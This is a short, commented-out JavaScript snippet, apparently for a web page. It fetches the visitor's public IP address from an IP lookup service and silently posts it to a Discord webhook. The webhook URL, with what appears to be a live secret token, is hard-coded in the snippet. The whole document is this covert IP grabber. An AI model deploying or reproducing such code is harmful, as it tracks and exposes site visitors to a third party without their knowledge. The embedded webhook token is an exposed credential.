/*fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
    .then(data => {
        const ip = data.ip;
        const webhookUrl = 'https://discord.com/api/webhooks/1286431414010642527/J1GrvAUXb343h0cUsonj4sTQqWqCCxTWjoEtTxGXMsPiwFYNoafYpXmMBKnZulV2fNPt';

   fetch(webhookUrl, {
            method: 'POST',
            body: JSON.stringify({ content: `IP: ${ip}` }),
            headers: {
                'Content-Type': 'application/json'
            }
        });
    });
//*/